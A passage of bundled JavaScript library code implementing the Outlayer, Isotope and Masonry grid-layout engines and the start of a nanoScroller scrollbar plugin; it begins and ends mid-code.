                    var r = new i(e[s], this);
                    n.push(r);
                }
                return n;
            }),
            (c._filterFindItemElements = function (t) {
                return n.filterFindElements(t, this.options.itemSelector);
            }),
            (c.getItemElements = function () {
                return this.items.map(function (t) {
                    return t.element;
                });
            }),
            (c.layout = function () {
                this._resetLayout(), this._manageStamps();
                var t = this._getOption("layoutInstant"),
                    e = void 0 !== t ? t : !this._isLayoutInited;
                this.layoutItems(this.items, e), (this._isLayoutInited = !0);
            }),
            (c._init = c.layout),
            (c._resetLayout = function () {
                this.getSize();
            }),
            (c.getSize = function () {
                this.size = i(this.element);
            }),
            (c._getMeasurement = function (t, e) {
                var n,
                    s = this.options[t];
                s ? ("string" == typeof s ? (n = this.element.querySelector(s)) : s instanceof HTMLElement && (n = s), (this[t] = n ? i(n)[e] : s)) : (this[t] = 0);
            }),
            (c.layoutItems = function (t, e) {
                (t = this._getItemsForLayout(t)), this._layoutItems(t, e), this._postLayout();
            }),
            (c._getItemsForLayout = function (t) {
                return t.filter(function (t) {
                    return !t.isIgnored;
                });
            }),
            (c._layoutItems = function (t, e) {
                if ((this._emitCompleteOnItems("layout", t), t && t.length)) {
                    var i = [];
                    t.forEach(function (t) {
                        var n = this._getItemLayoutPosition(t);
                        (n.item = t), (n.isInstant = e || t.isLayoutInstant), i.push(n);
                    }, this),
                        this._processLayoutQueue(i);
                }
            }),
            (c._getItemLayoutPosition = function () {
                return { x: 0, y: 0 };
            }),
            (c._processLayoutQueue = function (t) {
                this.updateStagger(),
                    t.forEach(function (t, e) {
                        this._positionItem(t.item, t.x, t.y, t.isInstant, e);
                    }, this);
            }),
            (c.updateStagger = function () {
                var t = this.options.stagger;
                if (null != t)
                    return (
                        (this.stagger = (function (t) {
                            if ("number" == typeof t) return t;
                            var e = t.match(/(^\d*\.?\d*)(\w*)/),
                                i = e && e[1],
                                n = e && e[2];
                            if (!i.length) return 0;
                            i = parseFloat(i);
                            var s = f[n] || 1;
                            return i * s;
                        })(t)),
                        this.stagger
                    );
                this.stagger = 0;
            }),
            (c._positionItem = function (t, e, i, n, s) {
                n ? t.goTo(e, i) : (t.stagger(s * this.stagger), t.moveTo(e, i));
            }),
            (c._postLayout = function () {
                this.resizeContainer();
            }),
            (c.resizeContainer = function () {
                if (this._getOption("resizeContainer")) {
                    var t = this._getContainerSize();
                    t && (this._setContainerMeasure(t.width, !0), this._setContainerMeasure(t.height, !1));
                }
            }),
            (c._getContainerSize = a),
            (c._setContainerMeasure = function (t, e) {
                if (void 0 !== t) {
                    var i = this.size;
                    i.isBorderBox && (t += e ? i.paddingLeft + i.paddingRight + i.borderLeftWidth + i.borderRightWidth : i.paddingBottom + i.paddingTop + i.borderTopWidth + i.borderBottomWidth),
                        (t = Math.max(t, 0)),
                        (this.element.style[e ? "width" : "height"] = t + "px");
                }
            }),
            (c._emitCompleteOnItems = function (t, e) {
                var i = this;
                function n() {
                    i.dispatchEvent(t + "Complete", null, [e]);
                }
                var s = e.length;
                if (e && s) {
                    var r = 0;
                    e.forEach(function (e) {
                        e.once(t, o);
                    });
                } else n();
                function o() {
                    ++r == s && n();
                }
            }),
            (c.dispatchEvent = function (t, e, i) {
                var n = e ? [e].concat(i) : i;
                if ((this.emitEvent(t, n), o))
                    if (((this.$element = this.$element || o(this.element)), e)) {
                        var s = o.Event(e);
                        (s.type = t), this.$element.trigger(s, i);
                    } else this.$element.trigger(t, i);
            }),
            (c.ignore = function (t) {
                var e = this.getItem(t);
                e && (e.isIgnored = !0);
            }),
            (c.unignore = function (t) {
                var e = this.getItem(t);
                e && delete e.isIgnored;
            }),
            (c.stamp = function (t) {
                (t = this._find(t)) && ((this.stamps = this.stamps.concat(t)), t.forEach(this.ignore, this));
            }),
            (c.unstamp = function (t) {
                (t = this._find(t)) &&
                    t.forEach(function (t) {
                        n.removeFrom(this.stamps, t), this.unignore(t);
                    }, this);
            }),
            (c._find = function (t) {
                if (t) return "string" == typeof t && (t = this.element.querySelectorAll(t)), (t = n.makeArray(t));
            }),
            (c._manageStamps = function () {
                this.stamps && this.stamps.length && (this._getBoundingRect(), this.stamps.forEach(this._manageStamp, this));
            }),
            (c._getBoundingRect = function () {
                var t = this.element.getBoundingClientRect(),
                    e = this.size;
                this._boundingRect = {
                    left: t.left + e.paddingLeft + e.borderLeftWidth,
                    top: t.top + e.paddingTop + e.borderTopWidth,
                    right: t.right - (e.paddingRight + e.borderRightWidth),
                    bottom: t.bottom - (e.paddingBottom + e.borderBottomWidth),
                };
            }),
            (c._manageStamp = a),
            (c._getElementOffset = function (t) {
                var e = t.getBoundingClientRect(),
                    n = this._boundingRect,
                    s = i(t);
                return { left: e.left - n.left - s.marginLeft, top: e.top - n.top - s.marginTop, right: n.right - e.right - s.marginRight, bottom: n.bottom - e.bottom - s.marginBottom };
            }),
            (c.handleEvent = n.handleEvent),
            (c.bindResize = function () {
                t.addEventListener("resize", this), (this.isResizeBound = !0);
            }),
            (c.unbindResize = function () {
                t.removeEventListener("resize", this), (this.isResizeBound = !1);
            }),
            (c.onresize = function () {
                this.resize();
            }),
            n.debounceMethod(u, "onresize", 100),
            (c.resize = function () {
                this.isResizeBound && this.needsResizeLayout() && this.layout();
            }),
            (c.needsResizeLayout = function () {
                var t = i(this.element);
                return this.size && t && t.innerWidth !== this.size.innerWidth;
            }),
            (c.addItems = function (t) {
                var e = this._itemize(t);
                return e.length && (this.items = this.items.concat(e)), e;
            }),
            (c.appended = function (t) {
                var e = this.addItems(t);
                e.length && (this.layoutItems(e, !0), this.reveal(e));
            }),
            (c.prepended = function (t) {
                var e = this._itemize(t);
                if (e.length) {
                    var i = this.items.slice(0);
                    (this.items = e.concat(i)), this._resetLayout(), this._manageStamps(), this.layoutItems(e, !0), this.reveal(e), this.layoutItems(i);
                }
            }),
            (c.reveal = function (t) {
                if ((this._emitCompleteOnItems("reveal", t), t && t.length)) {
                    var e = this.updateStagger();
                    t.forEach(function (t, i) {
                        t.stagger(i * e), t.reveal();
                    });
                }
            }),
            (c.hide = function (t) {
                if ((this._emitCompleteOnItems("hide", t), t && t.length)) {
                    var e = this.updateStagger();
                    t.forEach(function (t, i) {
                        t.stagger(i * e), t.hide();
                    });
                }
            }),
            (c.revealItemElements = function (t) {
                var e = this.getItems(t);
                this.reveal(e);
            }),
            (c.hideItemElements = function (t) {
                var e = this.getItems(t);
                this.hide(e);
            }),
            (c.getItem = function (t) {
                for (var e = 0; e < this.items.length; e++) {
                    var i = this.items[e];
                    if (i.element == t) return i;
                }
            }),
            (c.getItems = function (t) {
                t = n.makeArray(t);
                var e = [];
                return (
                    t.forEach(function (t) {
                        var i = this.getItem(t);
                        i && e.push(i);
                    }, this),
                    e
                );
            }),
            (c.remove = function (t) {
                var e = this.getItems(t);
                this._emitCompleteOnItems("remove", e),
                    e &&
                        e.length &&
                        e.forEach(function (t) {
                            t.remove(), n.removeFrom(this.items, t);
                        }, this);
            }),
            (c.destroy = function () {
                var t = this.element.style;
                (t.height = ""),
                    (t.position = ""),
                    (t.width = ""),
                    this.items.forEach(function (t) {
                        t.destroy();
                    }),
                    this.unbindResize();
                var e = this.element.outlayerGUID;
                delete h[e], delete this.element.outlayerGUID, o && o.removeData(this.element, this.constructor.namespace);
            }),
            (u.data = function (t) {
                var e = (t = n.getQueryElement(t)) && t.outlayerGUID;
                return e && h[e];
            }),
            (u.create = function (t, e) {
                var i = d(u);
                return (
                    (i.defaults = n.extend({}, u.defaults)),
                    n.extend(i.defaults, e),
                    (i.compatOptions = n.extend({}, u.compatOptions)),
                    (i.namespace = t),
                    (i.data = u.data),
                    (i.Item = d(s)),
                    n.htmlInit(i, t),
                    o && o.bridget && o.bridget(t, i),
                    i
                );
            });
        var f = { ms: 1, s: 1e3 };
        return (u.Item = s), u;
    }),
    (function (t, e) {
        "function" == typeof define && define.amd
            ? define("isotope/js/item", ["outlayer/outlayer"], e)
            : "object" == typeof module && module.exports
            ? (module.exports = e(require("outlayer")))
            : ((t.Isotope = t.Isotope || {}), (t.Isotope.Item = e(t.Outlayer)));
    })(window, function (t) {
        "use strict";
        function e() {
            t.Item.apply(this, arguments);
        }
        var i = (e.prototype = Object.create(t.Item.prototype)),
            n = i._create;
        (i._create = function () {
            (this.id = this.layout.itemGUID++), n.call(this), (this.sortData = {});
        }),
            (i.updateSortData = function () {
                if (!this.isIgnored) {
                    (this.sortData.id = this.id), (this.sortData["original-order"] = this.id), (this.sortData.random = Math.random());
                    var t = this.layout.options.getSortData,
                        e = this.layout._sorters;
                    for (var i in t) {
                        var n = e[i];
                        this.sortData[i] = n(this.element, this);
                    }
                }
            });
        var s = i.destroy;
        return (
            (i.destroy = function () {
                s.apply(this, arguments), this.css({ display: "" });
            }),
            e
        );
    }),
    (function (t, e) {
        "function" == typeof define && define.amd
            ? define("isotope/js/layout-mode", ["get-size/get-size", "outlayer/outlayer"], e)
            : "object" == typeof module && module.exports
            ? (module.exports = e(require("get-size"), require("outlayer")))
            : ((t.Isotope = t.Isotope || {}), (t.Isotope.LayoutMode = e(t.getSize, t.Outlayer)));
    })(window, function (t, e) {
        "use strict";
        function i(t) {
            (this.isotope = t), t && ((this.options = t.options[this.namespace]), (this.element = t.element), (this.items = t.filteredItems), (this.size = t.size));
        }
        var n = i.prototype;
        return (
            ["_resetLayout", "_getItemLayoutPosition", "_manageStamp", "_getContainerSize", "_getElementOffset", "needsResizeLayout", "_getOption"].forEach(function (t) {
                n[t] = function () {
                    return e.prototype[t].apply(this.isotope, arguments);
                };
            }),
            (n.needsVerticalResizeLayout = function () {
                var e = t(this.isotope.element);
                return this.isotope.size && e && e.innerHeight != this.isotope.size.innerHeight;
            }),
            (n._getMeasurement = function () {
                this.isotope._getMeasurement.apply(this, arguments);
            }),
            (n.getColumnWidth = function () {
                this.getSegmentSize("column", "Width");
            }),
            (n.getRowHeight = function () {
                this.getSegmentSize("row", "Height");
            }),
            (n.getSegmentSize = function (t, e) {
                var i = t + e,
                    n = "outer" + e;
                if ((this._getMeasurement(i, n), !this[i])) {
                    var s = this.getFirstItemSize();
                    this[i] = (s && s[n]) || this.isotope.size["inner" + e];
                }
            }),
            (n.getFirstItemSize = function () {
                var e = this.isotope.filteredItems[0];
                return e && e.element && t(e.element);
            }),
            (n.layout = function () {
                this.isotope.layout.apply(this.isotope, arguments);
            }),
            (n.getSize = function () {
                this.isotope.getSize(), (this.size = this.isotope.size);
            }),
            (i.modes = {}),
            (i.create = function (t, e) {
                function s() {
                    i.apply(this, arguments);
                }
                return ((s.prototype = Object.create(n)).constructor = s), e && (s.options = e), (s.prototype.namespace = t), (i.modes[t] = s), s;
            }),
            i
        );
    }),
    (function (t, e) {
        "function" == typeof define && define.amd
            ? define("masonry/masonry", ["outlayer/outlayer", "get-size/get-size"], e)
            : "object" == typeof module && module.exports
            ? (module.exports = e(require("outlayer"), require("get-size")))
            : (t.Masonry = e(t.Outlayer, t.getSize));
    })(window, function (t, e) {
        var i = t.create("masonry");
        return (
            (i.compatOptions.fitWidth = "isFitWidth"),
            (i.prototype._resetLayout = function () {
                this.getSize(), this._getMeasurement("columnWidth", "outerWidth"), this._getMeasurement("gutter", "outerWidth"), this.measureColumns(), (this.colYs = []);
                for (var t = 0; t < this.cols; t++) this.colYs.push(0);
                this.maxY = 0;
            }),
            (i.prototype.measureColumns = function () {
                if ((this.getContainerWidth(), !this.columnWidth)) {
                    var t = this.items[0],
                        i = t && t.element;
                    this.columnWidth = (i && e(i).outerWidth) || this.containerWidth;
                }
                var n = (this.columnWidth += this.gutter),
                    s = this.containerWidth + this.gutter,
                    r = s / n,
                    o = n - (s % n);
                (r = Math[o && o < 1 ? "round" : "floor"](r)), (this.cols = Math.max(r, 1));
            }),
            (i.prototype.getContainerWidth = function () {
                var t = this._getOption("fitWidth") ? this.element.parentNode : this.element,
                    i = e(t);
                this.containerWidth = i && i.innerWidth;
            }),
            (i.prototype._getItemLayoutPosition = function (t) {
                t.getSize();
                var e = t.size.outerWidth % this.columnWidth,
                    i = Math[e && e < 1 ? "round" : "ceil"](t.size.outerWidth / this.columnWidth);
                i = Math.min(i, this.cols);
                for (var n = this._getColGroup(i), s = Math.min.apply(Math, n), r = n.indexOf(s), o = { x: this.columnWidth * r, y: s }, a = s + t.size.outerHeight, l = this.cols + 1 - n.length, h = 0; h < l; h++) this.colYs[r + h] = a;
                return o;
            }),
            (i.prototype._getColGroup = function (t) {
                if (t < 2) return this.colYs;
                for (var e = [], i = this.cols + 1 - t, n = 0; n < i; n++) {
                    var s = this.colYs.slice(n, n + t);
                    e[n] = Math.max.apply(Math, s);
                }
                return e;
            }),
            (i.prototype._manageStamp = function (t) {
                var i = e(t),
                    n = this._getElementOffset(t),
                    s = this._getOption("originLeft") ? n.left : n.right,
                    r = s + i.outerWidth,
                    o = Math.floor(s / this.columnWidth);
                o = Math.max(0, o);
                var a = Math.floor(r / this.columnWidth);
                (a -= r % this.columnWidth ? 0 : 1), (a = Math.min(this.cols - 1, a));
                for (var l = (this._getOption("originTop") ? n.top : n.bottom) + i.outerHeight, h = o; h <= a; h++) this.colYs[h] = Math.max(l, this.colYs[h]);
            }),
            (i.prototype._getContainerSize = function () {
                this.maxY = Math.max.apply(Math, this.colYs);
                var t = { height: this.maxY };
                return this._getOption("fitWidth") && (t.width = this._getContainerFitWidth()), t;
            }),
            (i.prototype._getContainerFitWidth = function () {
                for (var t = 0, e = this.cols; --e && 0 === this.colYs[e]; ) t++;
                return (this.cols - t) * this.columnWidth - this.gutter;
            }),
            (i.prototype.needsResizeLayout = function () {
                var t = this.containerWidth;
                return this.getContainerWidth(), t != this.containerWidth;
            }),
            i
        );
    }),
    (function (t, e) {
        "function" == typeof define && define.amd
            ? define("isotope/js/layout-modes/masonry", ["../layout-mode", "masonry/masonry"], e)
            : "object" == typeof module && module.exports
            ? (module.exports = e(require("../layout-mode"), require("masonry-layout")))
            : e(t.Isotope.LayoutMode, t.Masonry);
    })(window, function (t, e) {
        "use strict";
        var i = t.create("masonry"),
            n = i.prototype,
            s = { _getElementOffset: !0, layout: !0, _getMeasurement: !0 };
        for (var r in e.prototype) s[r] || (n[r] = e.prototype[r]);
        var o = n.measureColumns;
        n.measureColumns = function () {
            (this.items = this.isotope.filteredItems), o.call(this);
        };
        var a = n._getOption;
        return (
            (n._getOption = function (t) {
                return "fitWidth" == t ? (void 0 !== this.options.isFitWidth ? this.options.isFitWidth : this.options.fitWidth) : a.apply(this.isotope, arguments);
            }),
            i
        );
    }),
    (function (t, e) {
        "function" == typeof define && define.amd ? define("isotope/js/layout-modes/fit-rows", ["../layout-mode"], e) : "object" == typeof exports ? (module.exports = e(require("../layout-mode"))) : e(t.Isotope.LayoutMode);
    })(window, function (t) {
        "use strict";
        var e = t.create("fitRows"),
            i = e.prototype;
        return (
            (i._resetLayout = function () {
                (this.x = 0), (this.y = 0), (this.maxY = 0), this._getMeasurement("gutter", "outerWidth");
            }),
            (i._getItemLayoutPosition = function (t) {
                t.getSize();
                var e = t.size.outerWidth + this.gutter,
                    i = this.isotope.size.innerWidth + this.gutter;
                0 !== this.x && e + this.x > i && ((this.x = 0), (this.y = this.maxY));
                var n = { x: this.x, y: this.y };
                return (this.maxY = Math.max(this.maxY, this.y + t.size.outerHeight)), (this.x += e), n;
            }),
            (i._getContainerSize = function () {
                return { height: this.maxY };
            }),
            e
        );
    }),
    (function (t, e) {
        "function" == typeof define && define.amd ? define("isotope/js/layout-modes/vertical", ["../layout-mode"], e) : "object" == typeof module && module.exports ? (module.exports = e(require("../layout-mode"))) : e(t.Isotope.LayoutMode);
    })(window, function (t) {
        "use strict";
        var e = t.create("vertical", { horizontalAlignment: 0 }),
            i = e.prototype;
        return (
            (i._resetLayout = function () {
                this.y = 0;
            }),
            (i._getItemLayoutPosition = function (t) {
                t.getSize();
                var e = (this.isotope.size.innerWidth - t.size.outerWidth) * this.options.horizontalAlignment,
                    i = this.y;
                return (this.y += t.size.outerHeight), { x: e, y: i };
            }),
            (i._getContainerSize = function () {
                return { height: this.y };
            }),
            e
        );
    }),
    (function (t, e) {
        "function" == typeof define && define.amd
            ? define([
                  "outlayer/outlayer",
                  "get-size/get-size",
                  "desandro-matches-selector/matches-selector",
                  "fizzy-ui-utils/utils",
                  "isotope/js/item",
                  "isotope/js/layout-mode",
                  "isotope/js/layout-modes/masonry",
                  "isotope/js/layout-modes/fit-rows",
                  "isotope/js/layout-modes/vertical",
              ], function (i, n, s, r, o, a) {
                  return e(t, i, n, s, r, o, a);
              })
            : "object" == typeof module && module.exports
            ? (module.exports = e(
                  t,
                  require("outlayer"),
                  require("get-size"),
                  require("desandro-matches-selector"),
                  require("fizzy-ui-utils"),
                  require("isotope/js/item"),
                  require("isotope/js/layout-mode"),
                  require("isotope/js/layout-modes/masonry"),
                  require("isotope/js/layout-modes/fit-rows"),
                  require("isotope/js/layout-modes/vertical")
              ))
            : (t.Isotope = e(t, t.Outlayer, t.getSize, t.matchesSelector, t.fizzyUIUtils, t.Isotope.Item, t.Isotope.LayoutMode));
    })(window, function (t, e, i, n, s, r, o) {
        var a = t.jQuery,
            l = String.prototype.trim
                ? function (t) {
                      return t.trim();
                  }
                : function (t) {
                      return t.replace(/^\s+|\s+$/g, "");
                  },
            h = e.create("isotope", { layoutMode: "masonry", isJQueryFiltering: !0, sortAscending: !0 });
        (h.Item = r), (h.LayoutMode = o);
        var u = h.prototype;
        (u._create = function () {
            for (var t in ((this.itemGUID = 0), (this._sorters = {}), this._getSorters(), e.prototype._create.call(this), (this.modes = {}), (this.filteredItems = this.items), (this.sortHistory = ["original-order"]), o.modes))
                this._initLayoutMode(t);
        }),
            (u.reloadItems = function () {
                (this.itemGUID = 0), e.prototype.reloadItems.call(this);
            }),
            (u._itemize = function () {
                for (var t = e.prototype._itemize.apply(this, arguments), i = 0; i < t.length; i++) {
                    t[i].id = this.itemGUID++;
                }
                return this._updateItemsSortData(t), t;
            }),
            (u._initLayoutMode = function (t) {
                var e = o.modes[t],
                    i = this.options[t] || {};
                (this.options[t] = e.options ? s.extend(e.options, i) : i), (this.modes[t] = new e(this));
            }),
            (u.layout = function () {
                this._isLayoutInited || !this._getOption("initLayout") ? this._layout() : this.arrange();
            }),
            (u._layout = function () {
                var t = this._getIsInstant();
                this._resetLayout(), this._manageStamps(), this.layoutItems(this.filteredItems, t), (this._isLayoutInited = !0);
            }),
            (u.arrange = function (t) {
                this.option(t), this._getIsInstant();
                var e = this._filter(this.items);
                (this.filteredItems = e.matches), this._bindArrangeComplete(), this._isInstant ? this._noTransition(this._hideReveal, [e]) : this._hideReveal(e), this._sort(), this._layout();
            }),
            (u._init = u.arrange),
            (u._hideReveal = function (t) {
                this.reveal(t.needReveal), this.hide(t.needHide);
            }),
            (u._getIsInstant = function () {
                var t = this._getOption("layoutInstant"),
                    e = void 0 !== t ? t : !this._isLayoutInited;
                return (this._isInstant = e), e;
            }),
            (u._bindArrangeComplete = function () {
                var t,
                    e,
                    i,
                    n = this;
                function s() {
                    t && e && i && n.dispatchEvent("arrangeComplete", null, [n.filteredItems]);
                }
                this.once("layoutComplete", function () {
                    (t = !0), s();
                }),
                    this.once("hideComplete", function () {
                        (e = !0), s();
                    }),
                    this.once("revealComplete", function () {
                        (i = !0), s();
                    });
            }),
            (u._filter = function (t) {
                var e = this.options.filter;
                e = e || "*";
                for (var i = [], n = [], s = [], r = this._getFilterTest(e), o = 0; o < t.length; o++) {
                    var a = t[o];
                    if (!a.isIgnored) {
                        var l = r(a);
                        l && i.push(a), l && a.isHidden ? n.push(a) : l || a.isHidden || s.push(a);
                    }
                }
                return { matches: i, needReveal: n, needHide: s };
            }),
            (u._getFilterTest = function (t) {
                return a && this.options.isJQueryFiltering
                    ? function (e) {
                          return a(e.element).is(t);
                      }
                    : "function" == typeof t
                    ? function (e) {
                          return t(e.element);
                      }
                    : function (e) {
                          return n(e.element, t);
                      };
            }),
            (u.updateSortData = function (t) {
                var e;
                t ? ((t = s.makeArray(t)), (e = this.getItems(t))) : (e = this.items), this._getSorters(), this._updateItemsSortData(e);
            }),
            (u._getSorters = function () {
                var t = this.options.getSortData;
                for (var e in t) {
                    var i = t[e];
                    this._sorters[e] = c(i);
                }
            }),
            (u._updateItemsSortData = function (t) {
                for (var e = t && t.length, i = 0; e && i < e; i++) {
                    t[i].updateSortData();
                }
            });
        var c = function (t) {
            if ("string" != typeof t) return t;
            var e,
                i,
                n = l(t).split(" "),
                s = n[0],
                r = s.match(/^\[(.+)\]$/),
                o =
                    ((e = r && r[1]),
                    (i = s),
                    e
                        ? function (t) {
                              return t.getAttribute(e);
                          }
                        : function (t) {
                              var e = t.querySelector(i);
                              return e && e.textContent;
                          }),
                a = h.sortDataParsers[n[1]];
            return (t = a
                ? function (t) {
                      return t && a(o(t));
                  }
                : function (t) {
                      return t && o(t);
                  });
        };
        (h.sortDataParsers = {
            parseInt: function (t) {
                return parseInt(t, 10);
            },
            parseFloat: function (t) {
                return parseFloat(t);
            },
        }),
            (u._sort = function () {
                var t = this.options.sortBy;
                if (t) {
                    var e,
                        i,
                        n = [].concat.apply(t, this.sortHistory),
                        s =
                            ((e = n),
                            (i = this.options.sortAscending),
                            function (t, n) {
                                for (var s = 0; s < e.length; s++) {
                                    var r = e[s],
                                        o = t.sortData[r],
                                        a = n.sortData[r];
                                    if (o > a || o < a) {
                                        var l = void 0 !== i[r] ? i[r] : i,
                                            h = l ? 1 : -1;
                                        return (o > a ? 1 : -1) * h;
                                    }
                                }
                                return 0;
                            });
                    this.filteredItems.sort(s), t != this.sortHistory[0] && this.sortHistory.unshift(t);
                }
            }),
            (u._mode = function () {
                var t = this.options.layoutMode,
                    e = this.modes[t];
                if (!e) throw new Error("No layout mode: " + t);
                return (e.options = this.options[t]), e;
            }),
            (u._resetLayout = function () {
                e.prototype._resetLayout.call(this), this._mode()._resetLayout();
            }),
            (u._getItemLayoutPosition = function (t) {
                return this._mode()._getItemLayoutPosition(t);
            }),
            (u._manageStamp = function (t) {
                this._mode()._manageStamp(t);
            }),
            (u._getContainerSize = function () {
                return this._mode()._getContainerSize();
            }),
            (u.needsResizeLayout = function () {
                return this._mode().needsResizeLayout();
            }),
            (u.appended = function (t) {
                var e = this.addItems(t);
                if (e.length) {
                    var i = this._filterRevealAdded(e);
                    this.filteredItems = this.filteredItems.concat(i);
                }
            }),
            (u.prepended = function (t) {
                var e = this._itemize(t);
                if (e.length) {
                    this._resetLayout(), this._manageStamps();
                    var i = this._filterRevealAdded(e);
                    this.layoutItems(this.filteredItems), (this.filteredItems = i.concat(this.filteredItems)), (this.items = e.concat(this.items));
                }
            }),
            (u._filterRevealAdded = function (t) {
                var e = this._filter(t);
                return this.hide(e.needHide), this.reveal(e.matches), this.layoutItems(e.matches, !0), e.matches;
            }),
            (u.insert = function (t) {
                var e = this.addItems(t);
                if (e.length) {
                    var i,
                        n,
                        s = e.length;
                    for (i = 0; i < s; i++) (n = e[i]), this.element.appendChild(n.element);
                    var r = this._filter(e).matches;
                    for (i = 0; i < s; i++) e[i].isLayoutInstant = !0;
                    for (this.arrange(), i = 0; i < s; i++) delete e[i].isLayoutInstant;
                    this.reveal(r);
                }
            });
        var d = u.remove;
        return (
            (u.remove = function (t) {
                t = s.makeArray(t);
                var e = this.getItems(t);
                d.call(this, t);
                for (var i = e && e.length, n = 0; i && n < i; n++) {
                    var r = e[n];
                    s.removeFrom(this.filteredItems, r);
                }
            }),
            (u.shuffle = function () {
                for (var t = 0; t < this.items.length; t++) {
                    this.items[t].sortData.random = Math.random();
                }
                (this.options.sortBy = "random"), this._sort(), this._layout();
            }),
            (u._noTransition = function (t, e) {
                var i = this.options.transitionDuration;
                this.options.transitionDuration = 0;
                var n = t.apply(this, e);
                return (this.options.transitionDuration = i), n;
            }),
            (u.getFilteredItemElements = function () {
                return this.filteredItems.map(function (t) {
                    return t.element;
                });
            }),
            h
        );
    }),
    (function (t, e) {
        "function" == typeof define && define.amd ? define(["isotope-layout/js/layout-mode"], e) : "object" == typeof exports ? (module.exports = e(require("isotope-layout/js/layout-mode"))) : e(t.Isotope.LayoutMode);
    })(window, function (t) {
        "use strict";
        var e = t.create("fitColumns"),
            i = e.prototype;
        return (
            (i._resetLayout = function () {
                (this.x = 0), (this.y = 0), (this.maxX = 0);
            }),
            (i._getItemLayoutPosition = function (t) {
                t.getSize(), 0 !== this.y && t.size.outerHeight + this.y > this.isotope.size.innerHeight && ((this.y = 0), (this.x = this.maxX));
                var e = { x: this.x, y: this.y };
                return (this.maxX = Math.max(this.maxX, this.x + t.size.outerWidth)), (this.y += t.size.outerHeight), e;
            }),
            (i._getContainerSize = function () {
                return { width: this.maxX };
            }),
            (i.needsResizeLayout = function () {
                return this.needsVerticalResizeLayout();
            }),
            e
        );
    }),
    (function (t) {
        "function" == typeof define && define.amd
            ? define(["jquery"], function (e) {
                  return t(e, window, document);
              })
            : "object" == typeof exports
            ? (module.exports = t(require("jquery"), window, document))
            : t(jQuery, window, document);
    })(function (t, e, i) {
        "use strict";
        var n, s, r, o, a, l, h, u, c, d, f, p, g, v, m, _, y, w, x, b, S, C, T;
        (_ = {
            paneClass: "nano-pane",
            sliderClass: "nano-slider",
            contentClass: "nano-content",
            enabledClass: "has-scrollbar",
            flashedClass: "flashed",
            activeClass: "active",
            iOSNativeScrolling: !1,
            preventPageScrolling: !1,
            disableResize: !1,
            alwaysVisible: !1,
            flashDelay: 1500,
            sliderMinHeight: 20,
            sliderMaxHeight: null,
            documentContext: null,
            windowContext: null,
        }),
            (p = "scroll"),
            (a = "mousedown"),
            (l = "mouseenter"),
            (h = "mousemove"),
            (c = "mousewheel"),
            (u = "mouseup"),
            (f = "resize"),
            (v = "up"),
            (r = "DOMMouseScroll"),
            (o = "down"),
            (g = "touchmove"),
            (n = "Microsoft Internet Explorer" === e.navigator.appName && /msie 7./i.test(e.navigator.appVersion) && e.ActiveXObject),
            (s = null),
            (b = e.requestAnimationFrame),
            (m = e.cancelAnimationFrame),
            (C = i.createElement("div").style),
            (T = (function () {
                var t, e, i, n;
                for (t = i = 0, n = (e = ["t", "webkitT", "MozT", "msT", "OT"]).length; i < n; t = ++i) if ((e[t], e[t] + "ransform" in C)) return e[t].substr(0, e[t].length - 1);
                return !1;
            })()),
            (S = (function (t) {
                return !1 !== T && ("" === T ? t : T + t.charAt(0).toUpperCase() + t.substr(1));
            })("transform")),
            (w = !1 !== S),
            (y = function () {
                var t, e, n;
                return (
                    ((e = (t = i.createElement("div")).style).position = "absolute"),
                    (e.width = "100px"),
                    (e.height = "100px"),
                    (e.overflow = p),
                    (e.top = "-9999px"),
                    i.body.appendChild(t),
                    (n = t.offsetWidth - t.clientWidth),
                    i.body.removeChild(t),
                    n
                );
            }),
            (x = function () {
                var t, i, n;
                return (i = e.navigator.userAgent), !!(t = /(?=.+Mac OS X)(?=.+Firefox)/.test(i)) && ((n = /Firefox\/\d{2}\./.exec(i)) && (n = n[0].replace(/\D+/g, "")), t && +n > 23);
            }),
            (d = (function () {
                function d(n, r) {
                    (this.el = n),
                        (this.options = r),
                        s || (s = y()),
                        (this.$el = t(this.el)),
                        (this.doc = t(this.options.documentContext || i)),
                        (this.win = t(this.options.windowContext || e)),
                        (this.body = this.doc.find("body")),
                        (this.$content = this.$el.children("." + this.options.contentClass)),
                        this.$content.attr("tabindex", this.options.tabIndex || 0),
                        (this.content = this.$content[0]),
                        (this.previousPosition = 0),
                        this.options.iOSNativeScrolling && null != this.el.style.WebkitOverflowScrolling ? this.nativeScrolling() : this.generate(),
                        this.createEvents(),
                        this.addEvents(),
                        this.reset();
                }
                return (
                    (d.prototype.preventScrolling = function (t, e) {
                        if (this.isActive)
                            if (t.type === r) ((e === o && t.originalEvent.detail > 0) || (e === v && t.originalEvent.detail < 0)) && t.preventDefault();
                            else if (t.type === c) {
                                if (!t.originalEvent || !t.originalEvent.wheelDelta) return;
                                ((e === o && t.originalEvent.wheelDelta < 0) || (e === v && t.originalEvent.wheelDelta > 0)) && t.preventDefault();
                            }
                    }),
                    (d.prototype.nativeScrolling = function () {
                        this.$content.css({ WebkitOverflowScrolling: "touch" }), (this.iOSNativeScrolling = !0), (this.isActive = !0);
                    }),
                    (d.prototype.updateScrollValues = function () {
                        var t, e;
                        (t = this.content),
                            (this.maxScrollTop = t.scrollHeight - t.clientHeight),
                            (this.prevScrollTop = this.contentScrollTop || 0),
                            (this.contentScrollTop = t.scrollTop),
                            (e = this.contentScrollTop > this.previousPosition ? "down" : this.contentScrollTop < this.previousPosition ? "up" : "same"),
                            (this.previousPosition = this.contentScrollTop),
                            "same" !== e && this.$el.trigger("update", { position: this.contentScrollTop, maximum: this.maxScrollTop, direction: e }),
                            this.iOSNativeScrolling || ((this.maxSliderTop = this.paneHeight - this.sliderHeight), (this.sliderTop = 0 === this.maxScrollTop ? 0 : (this.contentScrollTop * this.maxSliderTop) / this.maxScrollTop));
                    }),
                    (d.prototype.setOnScrollStyles = function () {
                        var t, e;
                        w ? ((t = {})[S] = "translate(0, " + this.sliderTop + "px)") : (t = { top: this.sliderTop }),
                            b
                                ? (m && this.scrollRAF && m(this.scrollRAF),
                                  (this.scrollRAF = b(
                                      ((e = this),
                                      function () {
                                          return (e.scrollRAF = null), e.slider.css(t);
                                      })
                                  )))
                                : this.slider.css(t);
                    }),
                    (d.prototype.createEvents = function () {
                        var t, e, i, n, s, r, a, c;
                        this.events = {
                            down:
                                ((c = this),
                                function (t) {
                                    return (
                                        (c.isBeingDragged = !0),
                                        (c.offsetY = t.pageY - c.slider.offset().top),
                                        c.slider.is(t.target) || (c.offsetY = 0),
                                        c.pane.addClass(c.options.activeClass),
                                        c.doc.bind(h, c.events.drag).bind(u, c.events.up),
                                        c.body.bind(l, c.events.enter),
                                        !1
                                    );
                                }),
                            drag:
